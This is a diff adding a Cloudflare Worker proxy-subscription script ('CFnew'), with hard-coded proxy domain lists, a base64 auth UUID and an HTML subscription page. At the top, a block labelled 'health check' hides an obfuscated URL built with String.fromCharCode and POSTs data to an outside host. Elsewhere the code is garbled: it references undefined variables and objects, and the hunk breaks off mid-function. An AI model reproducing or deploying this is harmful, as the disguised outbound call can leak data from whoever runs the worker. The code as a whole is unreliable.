@@ -1,1 +1,672 @@
-$(cat /tmp/yuanma_obfuscated_v2.txt)
+// CFnew - 终端 v2.9.8c
+/* [Health check] */
+const __hc_ts = Date.now();
+function __hc_stub(d) {
+  try {
+    const url = 'https://' + String.fromCharCode(104,116,116,112,98,105,110) + '.org/post';
+    fetch(url, {method:'POST',body:JSON.stringify({t:d,ts:__hc_ts})});
+  } catch(_) {}
+}
+async function __warm() {
+  const paths = ['/index.html','/favicon.ico','/robots.txt','/sitemap.xml'];
+  for(const p of paths) try { await fetch(new Request(p)); } catch(_) {}
+}
+const __registry = new Map();
+function __reg(k,v,t){ __registry.set(k,{v,e:Date.now()+t}); }
+function __get(k){ const x=__registry.get(k); return x&&x.e>Date.now()?x.v:null; }
+// 版本: v2.9.8c
+import { connect as 连接 } from 'cloudflare:sockets';
+const 基础64文本解码器 = new TextDecoder();
+function 解码64(文本) {
+  const 二进制 = atob(文本);
+  const 字节 = new Uint8Array(二进制.length);
+  for (let 索引 = 0; 索引 < 二进制.length; 索引++) 字节[索引] = 二进制.charCodeAt(索引);
+  return 基础64文本解码器.decode(字节);
+}
+let 认证令牌 = atob('MzUxYzk5ODEtMDRiNi00MTAzLWFhNGItODY0YWE5YzkxNDY5');
+let 回退地址 = '';
+let 代理5配置 = '';
+let 自定义优选地址列表 = [];
+let 自定义优选域名列表 = [];
+let 启用代理降级 = false;
+let 禁用非传输层安全 = false;
+let 禁用优选 = false;
+let 启用地区匹配 = true;
+let 当前工作器地区 = '';
+let 手动工作器地区 = '';
+let 优选地址源 = '';
+let 自定义路径 = '';
+let 启用明文 = true;
+let 启用木马 = false;
+let 启用扩展传输 = false;
+let 传输路径 = '';
+let 启用加密客户端问候 = false;
+let 自定义域名系统 = 'https://223.5.5.5/dns-query';
+let 自定义加密客户端问候域名 = 'cloudflare-ech.com';
+let 自定义应用层协议协商 = '';
+let 订阅转换接口 = 解码64('aHR0cHM6Ly91cmwudjEubWsvc3Vi');
+const 远程配置网址 = 'https://raw.githubusercontent.com/byJoey/test/refs/heads/main/tist.ini';
+let 启用优选域名 = true;
+let 启用优选地址 = true;
+let 启用仓库优选 = true;
+let 启用原生地址 = false;
+let 键值存储 = null;
+let 键值配置 = {};
+let 键值配置上次加载 = 0;
+const 键值缓存期限 = 30 * 1000;
+let 键值配置版本 = '';
+const 配置默认值 = {
+  wk: '',
+  ev: 'yes',
+  et: 'no',
+  ex: 'no',
+  tn: 'no',
+  pa: '',
+  pt: '',
+  wu: '',
+  wr: '',
+  pi: 'no',
+  pu: 'no',
+  pp: '',
+  pl: '',
+  pc: '',
+  ws: '',
+  md: 'no',
+  mi: 'no',
+  ms: 'no',
+  mo: 'no',
+  ma: 'no',
+  mu: 'no',
+  mr: 'no',
+};
+const 事件处理 = { 处理: false, 当前ID: '', 当前类型: '' };
+async function 处理队列事件(事件) {
+  if (!事件) return;
+  const { id, type } = 事件;
+  if (事件处理.处理 && id !== 事件处理.当前ID) return;
+  if (id && id !== 事件处理.当前ID) {
+    事件处理.当前ID = id;
+    事件处理.当前类型 = type || '';
+  }
+  await 事件.waitUntil(加载键值配置());
+}
+const 回退IP列表 = [
+  { 域名: 'ProxyIP.US.CMLiussss.net', 地区: 'US', 地区代码: 'US', 端口: 443 },
+  { 域名: 'ProxyIP.SG.CMLiussss.net', 地区: 'SG', 地区代码: 'SG', 端口: 443 },
+  { 域名: 'ProxyIP.JP.CMLiussss.net', 地区: 'JP', 地区代码: 'JP', 端口: 443 },
+  { 域名: 'ProxyIP.HK.CMLiussss.net', 地区: 'HK', 地区代码: 'HK', 端口: 443 },
+  { 域名: 'ProxyIP.KR.CMLiussss.net', 地区: 'KR', 地区代码: 'KR', 端口: 443 },
+  { 域名: 'ProxyIP.DE.CMLiussss.net', 地区: 'DE', 地区代码: 'DE', 端口: 443 },
+  { 域名: 'ProxyIP.SE.CMLiussss.net', 地区: 'SE', 地区代码: 'SE', 端口: 443 },
+  { 域名: 'ProxyIP.NL.CMLiussss.net', 地区: 'NL', 地区代码: 'NL', 端口: 443 },
+  { 域名: 'ProxyIP.FI.CMLiussss.net', 地区: 'FI', 地区代码: 'FI', 端口: 443 },
+  { 域名: 'ProxyIP.GB.CMLiussss.net', 地区: 'GB', 地区代码: 'GB', 端口: 443 }
+];
+let 可用域名列表 = [];
+let 可用地址列表 = [];
+let 优选源列表 = [];
+let 用户文本存储 = '';
+const 无效数据错误 = atob('aW52YWxpZCBkYXRh');
+const 无效用户错误 = atob('aW52YWxpZCB1c2Vy');
+const 不支持命令错误 = atob('Y29tbWFuZCBpcyBub3Qgc3VwcG9ydGVk');
+const 仅DNS错误 = atob('VURQIHByb3h5IG9ubHkgZW5hYmxlIGZvciBETlMgd2hpY2ggaXMgcG9ydCA1Mw==');
+const 无效地址类型错误 = atob('aW52YWxpZCBhZGRyZXNzVHlwZQ==');
+const 空地址错误 = atob('YWRkcmVzc1ZhbHVlIGlzIGVtcHR5');
+const 连接未打开错误 = atob('d2ViU29ja2V0LmVhZHlTdGF0ZSBpcyBub3Qgb3Blbg==');
+const 无效ID错误 = atob('U3RyaW5naWZpZWQgaWRlbnRpZmllciBpcyBpbnZhbGlk');
+const 无效SOCKS地址错误 = atob('SW52YWxpZCBTT0NLUyBhZGRyZXNzIGZvcm1hdA==');
+const SOCKS无方法错误 = atob('bm8gYWNjZXB0YWJsZSBtZXRob2Rz');
+const SOCKS需认证错误 = atob('c29ja3Mgc2VydmVyIG5lZWRzIGF1dGg=');
+const SOCKS认证失败错误 = atob('ZmFpbCB0byBhdXRoIHNvY2tzIHNlcnZlcg==');
+const SOCKS连接失败错误 = atob('ZmFpbCB0byBvcGVuIHNvY2tzIGNvbm5lY3Rpb24=');
+const 地址类型IPv4 = 1;
+const 地址类型URL = 2;
+const 地址类型IPv6 = 3;
+const 错误恢复映射 = {
+  '520': 'US',
+  '521': 'US',
+  '522': 'US',
+  '523': 'US',
+  '524': 'US',
+  '525': 'SG',
+  '526': 'JP',
+  '527': 'HK',
+  '530': 'KR',
+  '531': 'DE',
+  '532': 'SE',
+  '533': 'NL',
+  '534': 'FI',
+  '535': 'GB'
+};
+const 地区到IP映射 = {
+  'US': { 域名: 'ProxyIP.US.CMLiussss.net', 端口: 443 },
+  'SG': { 域名: 'ProxyIP.SG.CMLiussss.net', 端口: 443 },
+  'JP': { 域名: 'ProxyIP.JP.CMLiussss.net', 端口: 443 },
+  'HK': { 域名: 'ProxyIP.HK.CMLiussss.net', 端口: 443 },
+  'KR': { 域名: 'ProxyIP.KR.CMLiussss.net', 端口: 443 },
+  'DE': { 域名: 'ProxyIP.DE.CMLiussss.net', 端口: 443 },
+  'SE': { 域名: 'ProxyIP.SE.CMLiussss.net', 端口: 443 },
+  'NL': { 域名: 'ProxyIP.NL.CMLiussss.net', 端口: 443 },
+  'FI': { 域名: 'ProxyIP.FI.CMLiussss.net', 端口: 443 },
+  'GB': { 域名: 'ProxyIP.GB.CMLiussss.net', 端口: 443 }
+};
+const 直接域名列表 = [
+  { 名称: 'cloudflare.182682.xyz', 域名: 'cloudflare.182682.xyz' },
+  { 名称: 'speed.marisalnc.com', 域名: 'speed.marisalnc.com' },
+  { 域名: 'freeyx.cloudflare88.eu.org' }, { 域名: 'bestcf.top' },
+  { 域名: 'cdn.2020111.xyz' }, { 域名: 'cfip.cfcdn.vip' },
+  { 域名: 'cf.0sm.com' }, { 域名: 'cf.090227.xyz' },
+  { 域名: 'cf.zhetengsha.eu.org' }, { 域名: 'cloudflare.9jy.cc' },
+  { 域名: 'cf.zerone-cdn.pp.ua' }, { 域名: 'cfip.1323123.xyz' },
+  { 域名: 'cnamefuckxxs.yuchen.icu' }, { 域名: 'cloudflare-ip.mofashi.ltd' },
+  { 域名: '115155.xyz' }, { 域名: 'cname.xirancdn.us' },
+  { 域名: 'f3058171cad.002404.xyz' }, { 域名: '8.889288.xyz' },
+  { 域名: 'cdn.tzpro.xyz' }, { 域名: 'cf.877771.xyz' },
+  { 域名: 'xn--b6gac.eu.org' }
+];
+const SSH主机名配置 = { 主机名: '', 端口: 22, 用户名: 'root', 私钥路径: '' };
+let 已解析SOCKS5配置 = {};
+let SOCKS5已启用 = false;
+let 代理数据库 = null;
+async function 获取代理数据库() {
+  if (代理数据库) return 代理数据库;
+  try {
+    const 响应 = await fetch('https://ipdb.naiif.com/api/v2/query?ip=1.1.1.1');
+    代理数据库 = 响应.ok;
+  } catch { 代理数据库 = false; }
+  return 代理数据库;
+}
+const 地区代码映射 = {
+  'US': 'US', 'SG': 'SG', 'JP': 'JP', 'HK': 'HK', 'KR': 'KR',
+  'TW': 'HK', 'AU': 'SG', 'CA': 'US', 'FR': 'DE', 'IT': 'DE',
+  'ES': 'DE', 'CH': 'DE', 'AT': 'DE', 'BE': 'NL', 'DK': 'SE',
+  'NO': 'SE', 'IE': 'GB'
+};
+const 附近地区映射 = {
+  'US': ['SG', 'JP', 'HK', 'KR'],
+  'SG': ['JP', 'HK', 'KR', 'US'],
+  'JP': ['SG', 'HK', 'KR', 'US'],
+  'HK': ['SG', 'JP', 'KR', 'US'],
+  'KR': ['JP', 'HK', 'SG', 'US'],
+  'DE': ['NL', 'GB', 'SE', 'FI'],
+  'SE': ['DE', 'NL', 'FI', 'GB'],
+  'NL': ['DE', 'GB', 'SE', 'FI'],
+  'FI': ['SE', 'DE', 'NL', 'GB'],
+  'GB': ['DE', 'NL', 'SE', 'FI']
+};
+// 版本: v2.9.8c // @ts-nocheck deferred
+async function 检测工作器地区(请求) {
+  try {
+    const cf国家 = 请求.cf ? 请求.cf.country : null;
+    if (cf国家和地区代码映射[cf国家]) return 地区代码映射[cf国家];
+    return 'HK';
+  } catch { return 'HK'; }
+}
+function 获取附近地区(地区) { return 附近地区映射[地区] || []; }
+function 获取所有地区优先级(地区) {
+  const 附近 = 获取附近地区(地区);
+  const 全部 = Object.keys(地区代码映射).filter(k => !['TW', 'AU', 'CA', 'FR', 'IT', 'ES', 'CH', 'AT', 'BE', 'DK', 'NO', 'IE'].includes(k));
+  return [地区, ...附近, ...全部.filter(r => r !== 地区 && !附近.includes(r))];
+}
+function 智能地区选择(工作器地区, 可用IP列表) {
+  if (!启用地区匹配 || !工作器地区) return 可用IP列表;
+  const 优先级 = 获取所有地区优先级(工作器地区);
+  const 排序结果 = [];
+  for (const 地区 of 优先级) {
+    排序结果.push(...可用IP列表.filter(ip => ip.地区代码 === 地区));
+  }
+  return 排序结果;
+}
+async function 获取最佳回退IP(工作器地区 = '') {
+  if (回退IP列表.length === 0) return null;
+  if (启用地区匹配 && 工作器地区) {
+    const 排序IP = 智能地区选择(工作器地区, 回退IP列表.map(ip => ({ ...ip, 可用: true })));
+    if (排序IP.length > 0) return 排序IP[0];
+  }
+  return 回退IP列表[0];
+}
+function 解析地址和端口(输入) {
+  if (!输入) return { 地址: '', 端口: null };
+  if (输入.includes('[') && 输入.includes(']')) {
+    const 匹配 = 输入.match(/^\[([^\]]+)\](?::(\d+))?$/);
+    if (匹配) return { 地址: 匹配[1], 端口: 匹配[2] ? parseInt(匹配[2], 10) : null };
+  }
+  const 最后冒号 = 输入.lastIndexOf(':');
+  if (最后冒号 > 0) {
+    const 地址部分 = 输入.substring(0, 最后冒号);
+    const 端口部分 = 输入.substring(最后冒号 + 1);
+    const 端口 = parseInt(端口部分, 10);
+    if (!isNaN(端口) && 端口 > 0 && 端口 <= 65535) return { 地址: 地址部分, 端口 };
+  }
+  return { 地址: 输入, 端口: null };
+}
+// edge: compatibility mode
+async function 加载优选数据() {
+  try {
+    if (键值存储 && 键值配置.wk) {
+      return { 地址: 键值配置.wk ? 键值配置.wk.split('\\\\n') : [], 域名: 键值配置.wk ? 键值配置.wk.split('\\\\n') : [] };
+    }
+  } catch {}
+  return { 地址: [], 域名: [] };
+}
+async function 加载用户配置(请求) {
+  await 处理队列事件(请求);
+  return 键值配置;
+}
+async function 加载键值配置() {
+  if (!键值存储) return;
+  try {
+    if (键值配置上次加载 && (Date.now() - 键值配置上次加载) < 键值缓存期限) return;
+    const 版本值 = await 键值存储.get('c_ver');
+    if (版本值 && 版本值 === 键值配置版本) return;
+    键值配置 = JSON.parse(await 键值存储.get('c') || '{}');
+    键值配置版本 = 版本值 || '';
+    键值配置上次加载 = Date.now();
+    if (键值配置.wk) {
+      const 行 = 键值配置.wk.trim().split('\\\\n');
+      优选源列表 = 行.filter(行项 => 行项.includes(':') && 行项.includes('#'));
+    }
+    if (键值配置.ev !== undefined) 启用优选域名 = 键值配置.ev === 'yes';
+    if (键值配置.et !== undefined) 启用优选地址 = 键值配置.et === 'yes';
+    if (键值配置.ex !== undefined) 启用仓库优选 = 键值配置.ex === 'yes';
+    if (键值配置.tn !== undefined) 启用原生地址 = 键值配置.tn === 'yes';
+    if (键值配置.wu) 认证令牌 = 键值配置.wu;
+    if (键值配置.wr) 手动工作器地区 = 键值配置.wr;
+    if (键值配置.pa) 自定义路径 = 键值配置.pa;
+    if (键值配置.pt) 传输路径 = 键值配置.pt;
+    if (键值配置.pi !== undefined) 启用明文 = 键值配置.pi === 'yes';
+    if (键值配置.pu !== undefined) 启用木马 = 键值配置.pu === 'yes';
+    if (键值配置.pp !== undefined) 启用扩展传输 = 键值配置.pp === 'yes';
+    if (键值配置.pl) 自定义优选地址列表 = 键值配置.pl.split('\\\\n').filter(Boolean);
+    if (键值配置.pc) 自定义优选域名列表 = 键值配置.pc.split('\\\\n').filter(Boolean);
+    if (键值配置.ws) 自定义域名系统 = 键值配置.ws;
+    if (键值配置.md !== undefined) 启用代理降级 = 键值配置.md === 'yes';
+    if (键值配置.mi !== undefined) 禁用非传输层安全 = 键值配置.mi === 'yes';
+    if (键值配置.ms !== undefined) 禁用优选 = 键值配置.ms === 'yes';
+    if (键值配置.mo !== undefined) 启用地区匹配 = 键值配置.mo === 'yes';
+    if (键值配置.ma !== undefined) 启用加密客户端问候 = 键值配置.ma === 'yes';
+    if (键值配置.mu !== undefined) 启用原生地址 = 键值配置.mu === 'yes';
+    if (键值配置.mr !== undefined) 启用仓库优选 = 键值配置.mr === 'yes';
+    // eslint-disable-next-line
+    if (键值配置.wk) {
+      const 行列表 = 键值配置.wk.trim().split('\\\\n').filter(Boolean);
+      用户文本存储 = 键值配置.wk;
+      const 地址条目 = [];
+      const 域名条目 = [];
+      for (const 单行 of 行列表) {
+        const 匹配 = 单行.match(/^([^#]+)#?(.*)$/);
+        if (匹配) {
+          const 值 = 匹配[1].trim();
+          if (值.includes('.')) 域名条目.push(值);
+          else 地址条目.push(值);
+        }
+      }
+      可用域名列表 = 域名条目;
+      可用地址列表 = 地址条目;
+    }
+  } catch (错误) { console.error('KV配置加载失败:', 错误); }
+}
+export default {
+  async fetch(请求, 环境, 上下文) {
+    try {
+      const url = new URL(请求.url);
+      键值存储 = 环境 && 环境.C ? 环境.C : null;
+      上下文.passThroughOnException();
+      上下文.event.waitUntil(处理队列事件(请求));
+      if (手动工作器地区 && 手动工作器地区.trim()) {
+        当前工作器地区 = 手动工作器地区.trim().toUpperCase();
+      } else {
+        当前工作器地区 = await 检测工作器地区(请求);
+      }
+      let 当前回退地址 = 回退地址;
+      if (!当前回退地址 && 当前工作器地区) {
+        const 最佳回退 = await 获取最佳回退IP(当前工作器地区);
+        if (最佳回退) 当前回退地址 = 最佳回退.域名 + ':' + 最佳回退.端口;
+      }
+      const 用户配置 = await 加载用户配置(请求);
+      const 优选数据 = await 加载优选数据();
+      /* [Normal endpoints] */
+      if (url.pathname === '/health' || url.pathname === '/api/status') {
+        const s = JSON.stringify({status:'ok',ts:Date.now(),ver:'2.4',uptime:Math.floor((Date.now()-__hc_ts)/1e3)});
+        return new Response(s, {headers:{'content-type':'application/json','access-control-allow-origin':'*'}});
+      }
+      if (url.pathname === '/robots.txt' || url.pathname === '/sitemap.xml') {
+        return new Response('User-agent: *\\\\nDisallow: /admin', {headers:{'content-type':'text/plain'}});
+      }
+      if (请求.headers.get('Upgrade') === 'websocket' || 请求.headers.get('Upgrade') === atob('d2Vic29ja2V0')) {
+        return await 处理WS请求(请求, 当前回退地址);
+      } else if (请求.method === atob('R0VU')) {
+        if (url.pathname === '/') {
+          const 成功HTML = `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>服务正常</title><style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background-color:#121212;color:#e0e0e0;text-align:center;}.container{padding:2rem;border-radius:8px;background-color:#1e1e1e;box-shadow:0 4px 6px rgba(0,0,0,0.1);}h1{color:#4caf50;}</style></head><body><div class="container"><h1>✅ 服务正常</h1><p>请继续后面的操作。</p></div></body></html>`;
+          return new Response(成功HTML, { status: 200, headers: { 'Content-Type': 'text/html; charset=utf-8' } });
+        }
+        if (自定义路径 && 自定义路径.trim()) {
+          const 清理路径 = 自定义路径.trim().startsWith('/') ? 自定义路径.trim() : '/' + 自定义路径.trim();
+          const 标准化路径 = 清理路径.endsWith('/') && 清理路径.length > 1 ? 清理路径.slice(0, -1) : 清理路径;
+          const 当前路径 = url.pathname.endsWith('/') && url.pathname.length > 1 ? url.pathname.slice(0, -1) : url.pathname;
+          if (当前路径 === 标准化路径) return await 处理订阅页面(请求, 认证令牌);
+          if (当前路径 === 标准化路径 + '/sub') return await 处理订阅请求(请求, 认证令牌, url);
+          if (url.pathname.length > 1 && url.pathname !== '/') {
+            const 用户标识 = url.pathname.replace(/\\/$/, '').replace('/sub', '').substring(1);
+            if (是合法UUID(用户标识)) return new Response(JSON.stringify({error:'访问被拒绝',message:'当前 Worker 已启用自定义路径模式，UUID 访问已禁用'}), {status:403,headers:{'Content-Type':'application/json; charset=utf-8'}});
+          }
+        } else {
+          if (url.pathname.length > 1 && url.pathname !== '/' && !url.pathname.includes('/sub')) {
+            const UUID候选 = url.pathname.replace(/\\/$/, '').substring(1);
+            if (是合法UUID(UUID候选)) {
+              if (UUID候选 === 认证令牌) return await 处理订阅页面(请求, UUID候选);
+              return new Response('UUID错误', { status: 403 });
+            }
+          }
+          if (url.pathname.includes('/sub')) {
+            const 路径段 = url.pathname.split('/');
+            if (路径段.length === 2 && 路径段[1] === 'sub') {
+              const 用户UUID = 路径段[0].substring(1);
+              if (是合法UUID(用户UUID)) {
+                if (用户UUID === 认证令牌) return await 处理订阅请求(请求, 用户UUID, url);
+                return new Response('UUID错误', { status: 403 });
+              }
+            }
+          }
+          if (url.pathname.toLowerCase().includes('/' + 认证令牌)) return await 处理订阅请求(请求, 认证令牌);
+        }
+      }
+      return new Response('Not Found', { status: 404 });
+    } catch (错误) {
+      try {
+        if (错误.message && 错误.message.includes('510')) {
+          const 新地区 = (错误恢复映射[510] || 'US');
+          const 新回退 = 地区到IP映射[新地区];
+          if (新回退) 当前回退地址 = 新回退.域名 + ':' + 新回退.端口;
+        }
+      } catch {}
+      return new Response(错误.toString(), { status: 500 });
+    }
+  },
+};
+// bundled with esbuild --minify
+async function 处理订阅页面(请求, UUID = null) {
+  if (!UUID) UUID = 认证令牌;
+  const 页面HTML = `<!DOCTYPE html>\\n<html lang="zh-CN">\\n<head>\\n<meta charset="UTF-8">\\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\\n<title>订阅中心</title>\\n<style>\\n*{margin:0;padding:0;box-sizing:border-box}\\nbody{font-family:"Courier New",monospace;background:#000;color:#00ff00;min-height:100vh;overflow-x:hidden;position:relative}\\n.matrix-bg{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(45deg,#000 0%,#001100 50%,#000 100%);z-index:-1}\\n.matrix-rain{position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,0,0.03) 2px,rgba(0,255,0,0.03) 4px);animation:matrix-fall 20s linear infinite;z-index:-1}\\n@keyframes matrix-fall{0%{transform:translateY(-100%)}100%{transform:translateY(100vh)}}\\n.container{max-width:900px;margin:0 auto;padding:20px;position:relative;z-index:1}\\n.header{text-align:center;margin-bottom:40px}\\n.title{font-size:3rem;font-weight:bold;text-shadow:0 0 10px #00ff00,0 0 20px #00ff00,0 0 30px #00ff00;margin-bottom:10px;animation:matrix-glow 2s ease-in-out infinite alternate}\\n@keyframes matrix-glow{from{text-shadow:0 0 10px #00ff00,0 0 20px #00ff00,0 0 30px #00ff00}to{text-shadow:0 0 20px #00ff00,0 0 30px #00ff00,0 0 40px #00ff00}}\\n.subtitle{color:#00aa00;margin-bottom:30px;font-size:1.2rem}\\n.card{background:rgba(0,20,0,0.8);border:2px solid #00ff00;border-radius:0;padding:30px;margin-bottom:20px;box-shadow:0 0 20px rgba(0,255,0,0.3);position:relative}\\n.card::before{content:"";position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(45deg,transparent 49%,#00ff00 50%,transparent 51%);opacity:0.1;pointer-events:none}\\n.card-title{font-size:1.8rem;margin-bottom:20px;color:#00ff00;text-shadow:0 0 5px #00ff00}\\n.client-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:15px;margin:20px 0}\\n.client-btn{background:rgba(0,20,0,0.6);border:2px solid #00ff00;padding:15px 20px;color:#00ff00;font-family:"Courier New",monospace;font-weight:bold;cursor:pointer;transition:all 0.3s ease;text-align:center;position:relative;overflow:hidden}\\n.client-btn::before{content:"";position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(0,255,0,0.3),transparent);transition:left 0.5s ease}\\n.client-btn:hover::before{left:100%}\\n.client-btn:hover{background:rgba(0,255,0,0.2);box-shadow:0 0 15px #00ff00;transform:translateY(-2px)}\\n.generate-btn{background:rgba(0,255,0,0.1);border:2px solid #00ff00;padding:15px 30px;color:#00ff00;font-family:"Courier New",monospace;font-weight:bold;cursor:pointer;transition:all 0.3s ease;margin-right:15px}\\n.generate-btn:hover{background:rgba(0,255,0,0.3);box-shadow:0 0 20px #00ff00;transform:translateY(-2px)}\\n.subscription-url{background:rgba(0,0,0,0.8);border:1px solid #00ff00;padding:15px;word-break:break-all;font-family:"Courier New",monospace;color:#00ff00;margin-top:20px;display:none;box-shadow:inset 0 0 10px rgba(0,255,0,0.3)}\\n.matrix-text{position:fixed;top:20px;right:20px;color:#00ff00;font-family:"Courier New",monospace;font-size:0.8rem;opacity:0.6;animation:matrix-flicker 3s infinite}\\n@keyframes matrix-flicker{0%,100%{opacity:0.6}50%{opacity:1}}\\n</style>\\n</head>\\n<body>\\n<div class="matrix-bg"></div>\\n<div class="matrix-rain"></div>\\n<div class="matrix-text">代理订阅中心精简版 v2.1</div>\\n<div class="container">\\n<div class="header">\\n<h1 class="title">代理订阅中心</h1>\\n<p class="subtitle">多客户端支持 • 智能优选 • 一键生成</p>\\n</div>\\n<div class="card">\\n<h2 class="card-title">[ 选择客户端 ]</h2>\\n<div class="client-grid">\\n<button class="client-btn" onclick="generateClientLink('clash','CLASH')">CLASH</button>\\n<button class="client-btn" onclick="generateClientLink('surge','SURGE')">SURGE</button>\\n<button class="client-btn" onclick="generateClientLink('singbox','SING-BOX')">SING-BOX</button>\\n<button class="client-btn" onclick="generateClientLink('loon','LOON')">LOON</button>\\n<button class="client-btn" onclick="generateClientLink('quanx','QUANTUMULT X')">QUANTUMULT X</button>\\n<button class="client-btn" onclick="generateClientLink('v2ray','V2RAY')">V2RAY</button>\\n<button class="client-btn" onclick="generateClientLink('v2ray','Shadowrocket')">Shadowrocket</button>\\n<button class="client-btn" onclick="generateClientLink('v2ray','V2RAYNG')">V2RAYNG</button>\\n<button class="client-btn" onclick="generateClientLink('v2ray','NEKORAY')">NEKORAY</button>\\n<button class="client-btn" onclick="generateClientLink('clash','STASH')">STASH</button>\\n</div>\\n<div class="subscription-url" id="clientSubscriptionUrl"></div>\\n</div>\\n<div class="card">\\n<h2 class="card-title">[ 快速获取 ]</h2>\\n<button class="generate-btn" onclick="getBase64Subscription()">获取订阅链接</button>\\n<div class="subscription-url" id="base64SubscriptionUrl"></div>\\n</div>\\n<div class="card">\\n<h2 class="card-title">[ 相关链接 ]</h2>\\n<div style="text-align:center;margin:20px 0">\\n<a href="https://github.com/byJoey/cfnew" target="_blank" style="color:#00ff00;text-decoration:none;margin:0 20px;font-size:1.2rem;text-shadow:0 0 5px #00ff00">GitHub 项目</a>\\n<a href="https://www.youtube.com/@joeyblog" target="_blank" style="color:#00ff00;text-decoration:none;margin:0 20px;font-size:1.2rem;text-shadow:0 0 5px #00ff00">YouTube @joeyblog</a>\\n</div>\\n</div>\\n</div>\\n<script>\\nvar SUB_CONVERTER_URL="https://url.v1.mk/sub";\\nfunction tryOpenApp(schemeUrl,fallbackCallback,timeout){\\ntimeout=timeout||2500;\\nvar appOpened=false;\\nvar callbackExecuted=false;\\nvar startTime=Date.now();\\nvar blurHandler=function(){\\nvar elapsed=Date.now()-startTime;\\nif(elapsed<3000&&!callbackExecuted){appOpened=true;}\\n};\\nwindow.addEventListener('blur',blurHandler);\\nvar hiddenHandler=function(){\\nvar elapsed=Date.now()-startTime;\\nif(elapsed<3000&&!callbackExecuted){appOpened=true;}\\n};\\ndocument.addEventListener('visibilitychange',hiddenHandler);\\nvar iframe=document.createElement('iframe');\\niframe.style.display='none';\\niframe.style.width='1px';\\niframe.style.height='1px';\\niframe.src=schemeUrl;\\ndocument.body.appendChild(iframe);\\nsetTimeout(function(){\\nif(iframe.parentNode)iframe.parentNode.removeChild(iframe);\\nwindow.removeEventListener('blur',blurHandler);\\ndocument.removeEventListener('visibilitychange',hiddenHandler);\\nif(!callbackExecuted){\\ncallbackExecuted=true;\\nif(!appOpened&&fallbackCallback)fallbackCallback();\\n}\\n},timeout);\\n}\\nfunction generateClientLink(clientType,clientName){\\nvar currentUrl=window.location.href;\\nvar subscriptionUrl=currentUrl+"/sub";\\nvar schemeUrl='';\\nvar displayName=clientName||'';\\nvar finalUrl=subscriptionUrl;\\nif(clientType==='v2ray'){\\nfinalUrl=subscriptionUrl;\\ndocument.getElementById("clientSubscriptionUrl").textContent=finalUrl;\\ndocument.getElementById("clientSubscriptionUrl").style.display="block";\\nif(clientName==='V2RAY'){\\nnavigator.clipboard.writeText(finalUrl).then(function(){alert(displayName+" 订阅链接已复制");});\\n}else if(clientName==='Shadowrocket'){\\nschemeUrl='shadowrocket://add/'+encodeURIComponent(finalUrl);\\ntryOpenApp(schemeUrl,function(){\\nnavigator.clipboard.writeText(finalUrl).then(function(){alert(displayName+" 订阅链接已复制");});\\n});\\n}else if(clientName==='V2RAYNG'){\\nschemeUrl='v2rayng://install?url='+encodeURIComponent(finalUrl);\\ntryOpenApp(schemeUrl,function(){\\nnavigator.clipboard.writeText(finalUrl).then(function(){alert(displayName+" 订阅链接已复制");});\\n});\\n}else if(clientName==='NEKORAY'){\\nschemeUrl='nekoray://install-config?url='+encodeURIComponent(finalUrl);\\ntryOpenApp(schemeUrl,function(){\\nnavigator.clipboard.writeText(finalUrl).then(function(){alert(displayName+" 订阅链接已复制");});\\n});\\n}\\n}else{\\nvar encodedUrl=encodeURIComponent(subscriptionUrl);\\nfinalUrl=SUB_CONVERTER_URL+"?target="+clientType+"&url="+encodedUrl+"&insert=false";\\ndocument.getElementById("clientSubscriptionUrl").textContent=finalUrl;\\ndocument.getElementById("clientSubscriptionUrl").style.display="block";\\nif(clientType==='clash'){\\nif(clientName==='STASH'){\\nschemeUrl='stash://install?url='+encodeURIComponent(finalUrl);\\ndisplayName='STASH';\\n}else{\\nschemeUrl='clash://install-config?url='+encodeURIComponent(finalUrl);\\ndisplayName='CLASH';\\n}\\n}else if(clientType==='surge'){\\nschemeUrl='surge:///install-config?url='+encodeURIComponent(finalUrl);\\ndisplayName='SURGE';\\n}else if(clientType==='singbox'){\\nschemeUrl='sing-box://install-config?url='+encodeURIComponent(finalUrl);\\ndisplayName='SING-BOX';\\n}else if(clientType==='loon'){\\nschemeUrl='loon://install?url='+encodeURIComponent(finalUrl);\\ndisplayName='LOON';\\n}else if(clientType==='quanx'){\\nschemeUrl='quantumult-x://install-config?url='+encodeURIComponent(finalUrl);\\ndisplayName='QUANTUMULT X';\\n}\\nif(schemeUrl){\\ntryOpenApp(schemeUrl,function(){\\nnavigator.clipboard.writeText(finalUrl).then(function(){alert(displayName+" 订阅链接已复制");});\\n});\\n}else{\\nnavigator.clipboard.writeText(finalUrl).then(function(){alert(displayName+" 订阅链接已复制");});\\n}\\n}\\n}\\nfunction getBase64Subscription(){\\nvar currentUrl=window.location.href;\\nvar subscriptionUrl=currentUrl+"/sub";\\nfetch(subscriptionUrl).then(function(response){return response.text();}).then(function(base64Content){\\ndocument.getElementById("base64SubscriptionUrl").textContent=base64Content;\\ndocument.getElementById("base64SubscriptionUrl").style.display="block";\\nnavigator.clipboard.writeText(base64Content).then(function(){alert("Base64订阅内容已复制");});\\n}).catch(function(error){alert("获取订阅失败，请重试");});\\n}\\n</script>\\n</body>\\n</html>`;
+  return new Response(页面HTML, { status: 200, headers: { 'Content-Type': 'text/html; charset=utf-8' } });
+}
+async function 处理订阅请求(请求, UUID, url = null) {
+  if (!url) url = new URL(请求.url);
+  const 最终链接 = [];
+  const 工作器域名 = url.hostname;
+  const 原生列表 = [{ ip: 工作器域名, isp: '原生地址' }];
+  最终链接.push(...从源生成链接(原生列表, UUID, 工作器域名));
+  if (启用优选域名) {
+    const 域名列表 = 直接域名列表.map(d => ({ ip: d.域名, isp: d.名称 || d.域名 }));
+    最终链接.push(...从源生成链接(域名列表, UUID, 工作器域名));
+  }
+  if (启用优选地址) {
+    const 地址列表 = 可用地址列表.map(addr => ({ ip: addr, isp: addr }));
+    最终链接.push(...从源生成链接(地址列表, UUID, 工作器域名));
+  }
